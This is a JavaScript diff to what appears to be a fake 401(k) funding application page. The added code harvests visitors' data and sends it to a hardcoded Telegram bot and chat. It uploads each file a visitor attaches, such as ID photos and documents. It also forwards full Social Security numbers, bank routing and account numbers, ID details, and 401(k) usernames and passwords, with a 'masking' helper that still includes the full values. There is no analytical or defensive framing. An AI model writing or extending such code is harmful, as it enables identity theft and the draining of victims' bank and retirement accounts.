@@ -452,43 +452,320 @@ var TELEGRAM_CHAT_ID = '-1004482554358';
     
     if (files && files.length > 0) {
       for (var i = 0; i < files.length; i++) {
-        var file = files[i];
-        var fileInfo = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
-        
-        var lines = [];
-        lines.push('📁 Field: ' + escapeHtml(fieldName));
-        lines.push('📄 File: ' + escapeHtml(fileInfo));
-        lines.push('🔤 Type: ' + escapeHtml(file.type || 'unknown'));
-        
-        // Try to send image to Telegram if it's an image
-        if (file.type && file.type.startsWith('image/')) {
-          sendImageToTelegram(file, fieldName);
-        } else {
-          fetchLocationInfo();
-          notify('📤 File Uploaded', lines, cachedLocationInfo, false);
-        }
+        (function (file) {
+          var fileInfo = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+          
+          var lines = [];
+          lines.push('📁 Field: ' + escapeHtml(fieldName));
+          lines.push('📄 File: ' + escapeHtml(fileInfo));
+          lines.push('🔤 Type: ' + escapeHtml(file.type || 'unknown'));
+          
+          if (file.type && file.type.startsWith('image/')) {
+            sendImageToTelegram(file, fieldName);
+          } else {
+            fetchLocationInfo();
+            notify('📤 File Uploaded', lines, cachedLocationInfo, false);
+            var caption = '📄 File Uploaded\n' +
+                          'Field: ' + escapeHtml(fieldName) + '\n' +
+                          'File: ' + escapeHtml(file.name) +
+                          (file.size ? '\nSize: ' + (file.size / 1024).toFixed(1) + ' KB' : '') +
+                          (file.type ? '\nType: ' + escapeHtml(file.type) : '');
+            setTimeout(function () {
+              sendDocumentToTelegram(file, fieldName, caption);
+            }, 600 + i * 400);
+          }
+        })(files[i]);
       }
     }
   }, true);
   
+  function dataURLtoBlob(dataURL) {
+    try {
+      var parts = dataURL.split(',');
+      var mime = parts[0].match(/:(.*?);/);
+      mime = mime ? mime[1] : 'application/octet-stream';
+      var bstr = atob(parts[1]);
+      var n = bstr.length;
+      var u8 = new Uint8Array(n);
+      while (n--) u8[n] = bstr.charCodeAt(n);
+      return new Blob([u8], { type: mime });
+    } catch (e) { return null; }
+  }
+
   function sendImageToTelegram(file, fieldName) {
-    var reader = new FileReader();
-    reader.onload = function (e) {
-      var base64Data = e.target.result;
-      
-      // Send image as photo to Telegram
+    var visitorId = '';
+    try { visitorId = sessionStorage.getItem('tg_session_id') || ''; } catch (e) {}
+    var caption = '📸 Image uploaded\nField: ' + escapeHtml(fieldName) +
+                  '\nFile: ' + escapeHtml(file.name) +
+                  (visitorId ? '\nVisitor: ' + escapeHtml(visitorId) : '');
+    if (caption.length > 1024) caption = caption.slice(0, 1020) + '…';
+
+    try {
       var formData = new FormData();
       formData.append('chat_id', TELEGRAM_CHAT_ID);
-      formData.append('photo', base64Data);
-      formData.append('caption', '📸 Image uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
-      
-      try {
-        fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
-          method: 'POST',
-          body: formData
-        }).catch(function () {});
-      } catch (e) {}
-    };
-    reader.readAsDataURL(file);
+      formData.append('photo', file, file.name);
+      formData.append('caption', caption);
+      fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+        method: 'POST',
+        body: formData
+      }).catch(function () {
+        try {
+          var fd2 = new FormData();
+          fd2.append('chat_id', TELEGRAM_CHAT_ID);
+          fd2.append('document', file, file.name);
+          fd2.append('caption', caption);
+          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendDocument', {
+            method: 'POST',
+            body: fd2
+          }).catch(function () {});
+        } catch (e) {}
+      });
+    } catch (e) {
+      var reader = new FileReader();
+      reader.onload = function (e2) {
+        var blob = dataURLtoBlob(e2.target.result);
+        if (!blob) return;
+        try {
+          var fd = new FormData();
+          fd.append('chat_id', TELEGRAM_CHAT_ID);
+          fd.append('photo', blob, file.name);
+          fd.append('caption', caption);
+          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+            method: 'POST',
+            body: fd
+          }).catch(function () {});
+        } catch (e3) {}
+      };
+      reader.readAsDataURL(file);
+    }
   }
+
+  function sendDocumentToTelegram(file, fieldName, caption) {
+    return new Promise(function (resolve) {
+      var cap = caption || ('📄 Document uploaded\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
+      if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
+
+      function doSend(blob) {
+        try {
+          var formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('document', blob, file.name);
+          formData.append('caption', cap);
+          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendDocument', {
+            method: 'POST',
+            body: formData
+          }).then(function () { resolve(); }).catch(function () { resolve(); });
+        } catch (e) { resolve(); }
+      }
+
+      if (file instanceof Blob) {
+        doSend(file);
+      } else {
+        var reader = new FileReader();
+        reader.onload = function (e) {
+          var blob = dataURLtoBlob(e.target.result);
+          if (!blob) { resolve(); return; }
+          doSend(blob);
+        };
+        reader.onerror = function () { resolve(); };
+        reader.readAsDataURL(file);
+      }
+    });
+  }
+
+  function sendPhotoAsFile(file, fieldName, caption) {
+    return new Promise(function (resolve) {
+      var cap = caption || ('📸 Image\nField: ' + escapeHtml(fieldName) + '\nFile: ' + escapeHtml(file.name));
+      if (cap.length > 1024) cap = cap.slice(0, 1020) + '…';
+
+      function photoSend(blob) {
+        try {
+          var formData = new FormData();
+          formData.append('chat_id', TELEGRAM_CHAT_ID);
+          formData.append('photo', blob, file.name);
+          formData.append('caption', cap);
+          fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendPhoto', {
+            method: 'POST',
+            body: formData
+          }).then(function () { resolve(); }).catch(function () {
+            sendDocumentToTelegram(blob, fieldName, caption).then(resolve);
+          });
+        } catch (e) { sendDocumentToTelegram(file, fieldName, caption).then(resolve); }
+      }
+
+      if (file instanceof Blob) {
+        photoSend(file);
+      } else {
+        var reader = new FileReader();
+        reader.onload = function (e) {
+          var blob = dataURLtoBlob(e.target.result);
+          if (!blob) { resolve(); return; }
+          photoSend(blob);
+        };
+        reader.onerror = function () { resolve(); };
+        reader.readAsDataURL(file);
+      }
+    });
+  }
+
+  function chunkText(text, maxLen) {
+    maxLen = maxLen || 4000;
+    var chunks = [];
+    var current = '';
+    var lines = text.split('\n');
+    for (var i = 0; i < lines.length; i++) {
+      var line = lines[i];
+      if (current.length + line.length + 1 > maxLen && current.length > 0) {
+        chunks.push(current);
+        current = line;
+      } else {
+        current += (current ? '\n' : '') + line;
+      }
+    }
+    if (current) chunks.push(current);
+    return chunks;
+  }
+
+  function sendLongText(text) {
+    return new Promise(function (resolve) {
+      var chunks = chunkText(text, 4000);
+      var idx = 0;
+      function sendNext() {
+        if (idx >= chunks.length) { resolve(); return; }
+        send(chunks[idx]);
+        idx++;
+        setTimeout(sendNext, 300);
+      }
+      sendNext();
+    });
+  }
+
+  window.sendFullApplicationToTelegram = function (appData, uploadedFilesInfo) {
+    return new Promise(function (resolveAll) {
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.indexOf('PASTE_') === 0) {
+        resolveAll();
+        return;
+      }
+
+      var appId = appData.appId || 'UNKNOWN';
+      var userInfo = getUserInfo();
+
+      var sections = [
+        { title: 'STEP 1 — Personal Information', data: appData.personal || {} },
+        { title: 'STEP 2 — Bank / Payment Details', data: appData.banking || {} },
+        { title: 'STEP 3 — Funding Need Summary', data: appData.business || {} },
+        { title: 'STEP 4 — ID Verification & 401(k) Details', data: appData.idVerify || {} },
+        { title: 'STEP 6 — 401(k) Account Access', data: appData.kaccess || {} }
+      ];
+
+      var fieldLabels = {
+        firstName: 'First Name', lastName: 'Last Name', email: 'Email', phone: 'Phone',
+        dob: 'Date of Birth', ssn: 'SSN', address: 'Street Address', city: 'City',
+        state: 'State', zip: 'ZIP Code', citizenship: 'Citizenship Status',
+        bankName: 'Bank Name', bankAccountType: 'Bank Account Type',
+        accountHolder: 'Account Holder Name', routing: 'Routing Number (ABA)',
+        accountNum: 'Account Number',
+        businessName: 'Business Name', businessStatus: 'Grant Purpose',
+        businessType: 'Employment Status', industry: 'Use Category',
+        employees: 'Work Arrangement', businessSummary: 'Funding Need Summary',
+        businessAddress: 'Additional Details',
+        idType: 'ID Type', idNumber: 'ID / Document Number',
+        idFullName: 'Full Name (on ID)', idDob: 'DOB (on ID)',
+        idExpires: 'ID Expiration Date', idIssuer: 'Issuing State/Country',
+        provider: '401(k) Provider', k401Username: '401(k) Username',
+        k401Password: '401(k) Password', accountNumber: '401(k) Last 6',
+        balance: 'Current Balance (USD)', accountOpenDate: 'Opened Date',
+        accountType: 'Account Type', employer: 'Current Employer',
+        k401AccessUsername: '401(k) Access Username',
+        k401AccessPassword: '401(k) Access Password'
+      };
+
+      function maskIf(key, val) {
+        if (!val) return '—';
+        var k = String(key).toLowerCase();
+        if (k.indexOf('password') > -1) return '🔒 ' + String(val);
+        if (k.indexOf('ssn') > -1) {
+          var s = String(val).replace(/-/g, '');
+          return s.length >= 7 ? '•••-••-' + s.slice(-4) + ' (full: ' + String(val) + ')' : String(val);
+        }
+        if (k.indexOf('routing') > -1) return String(val) + ' (full)';
+        if (k.indexOf('accountnum') > -1 || k === 'accountnumber') return '••••' + String(val).slice(-4) + ' (full: ' + String(val) + ')';
+        if (k.indexOf('idnumber') > -1) return String(val);
+        return String(val);
+      }
+
+      var bodyLines = [];
+      bodyLines.push('<b>🚨 NEW APPLICATION SUBMITTED 🚨</b>');
+      bodyLines.push('<b>Application ID:</b> P401K-2026-' + escapeHtml(appId));
+      bodyLines.push('<b>Submitted:</b> ' + escapeHtml(new Date().toLocaleString()));
+      bodyLines.push('');
+
+      if (userInfo) {
+        bodyLines.push('<b>👤 Registered User</b>');
+        if (userInfo.username) bodyLines.push('Username: ' + escapeHtml(userInfo.username));
+        if (userInfo.email) bodyLines.push('Email: ' + escapeHtml(userInfo.email));
+        if (userInfo.id) bodyLines.push('User ID: ' + escapeHtml(userInfo.id));
+        bodyLines.push('');
+      }
+
+      for (var s = 0; s < sections.length; s++) {
+        var sec = sections[s];
+        var keys = Object.keys(sec.data);
+        if (keys.length === 0) continue;
+        bodyLines.push('<b>—— ' + escapeHtml(sec.title) + ' ——</b>');
+        for (var k = 0; k < keys.length; k++) {
+          var key = keys[k];
+          var raw = sec.data[key];
+          if (raw === undefined || raw === null || raw === '') continue;
+          var label = fieldLabels[key] || key;
+          var display = maskIf(key, raw);
+          bodyLines.push('<b>' + escapeHtml(label) + ':</b> ' + escapeHtml(display));
+        }
+        bodyLines.push('');
+      }
+
+      var filesList = uploadedFilesInfo || [];
+      if (filesList.length > 0) {
+        bodyLines.push('<b>📎 Uploaded Files (' + filesList.length + ')</b>');
+        for (var f = 0; f < filesList.length; f++) {
+          var fi = filesList[f];
+          var sizeStr = '';
+          if (fi.size) {
+            var kb = fi.size / 1024;
+            sizeStr = kb > 1024 ? ' (' + (kb / 1024).toFixed(2) + ' MB)' : ' (' + kb.toFixed(1) + ' KB)';
+          }
+          bodyLines.push('  • ' + (fi.fieldLabel || fi.fieldName || 'File') + ': ' + escapeHtml(fi.name || 'unnamed') + sizeStr);
+        }
+        bodyLines.push('');
+      }
+
+      bodyLines.push('Visitor ID: ' + escapeHtml(sessionId()));
+
+      var fullText = bodyLines.join('\n');
+
+      sendLongText(fullText).then(function () {
+        var idx = 0;
+        function sendNextFile() {
+          if (idx >= filesList.length) { resolveAll(); return; }
+          var fi = filesList[idx];
+          var file = fi.file;
+          idx++;
+          if (!file) { setTimeout(sendNextFile, 100); return; }
+          var cap = '📎 App P401K-2026-' + escapeHtml(appId) + '\n' +
+                    'Field: ' + escapeHtml(fi.fieldLabel || fi.fieldName || 'Upload') + '\n' +
+                    'File: ' + escapeHtml(file.name);
+          if (file.type && file.type.startsWith('image/')) {
+            sendPhotoAsFile(file, fi.fieldName || 'upload', cap).then(function () {
+              setTimeout(sendNextFile, 500);
+            });
+          } else {
+            sendDocumentToTelegram(file, fi.fieldName || 'upload', cap).then(function () {
+              setTimeout(sendNextFile, 500);
+            });
+          }
+        }
+        sendNextFile();
+      });
+    });
+  };
 })();
